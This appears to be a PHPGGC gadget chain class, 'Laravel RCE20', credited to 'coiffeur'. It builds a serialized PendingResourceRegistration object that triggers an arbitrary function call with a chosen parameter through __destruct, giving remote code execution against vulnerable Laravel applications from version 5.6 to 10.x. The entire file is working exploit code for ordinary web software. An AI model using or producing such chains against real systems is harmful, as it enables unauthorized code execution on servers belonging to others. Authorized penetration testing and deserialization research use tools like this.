<?php

namespace GadgetChain\Laravel;

class RCE20 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.6 <= 10.x';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';

    public function generate(array $parameters)
    {
        return new \Illuminate\Routing\PendingResourceRegistration(
            $parameters['function'],
            $parameters['parameter']
        );
    }
}
